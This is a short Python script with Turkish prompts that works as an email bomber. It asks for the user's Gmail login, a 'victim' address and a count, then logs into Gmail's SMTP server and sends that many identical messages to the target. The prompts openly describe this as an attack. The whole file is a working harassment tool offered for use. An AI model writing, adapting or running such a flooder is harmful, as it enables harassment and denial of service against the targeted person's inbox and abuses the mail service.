from tkinter import *
import smtplib

message = input("Başlığı yazınız : ")
print(" ")
print("================================")
print("Gmail hesabınız ile giriş yapın.")
print("================================")
print(" ")

login1 = input("Mail : ")
login2 = input("Şifre : ")

print(" ")
print("================================================")
print("Saldırı yapılıcak kişinin mail adresini yazınız.")
print("================================================")
print(" ")

victim = input("Kurban Mail : ")

sayi = int(input("Kaç adet mail gönderilsin : "))

for i in range(sayi):
    content = message
    mail = smtplib.SMTP("smtp.gmail.com", 587)
    mail.ehlo()
    mail.starttls()
    mail.login(login1, login2)
    mail.sendmail(login1, victim, content)
    print("Gönderildi!")
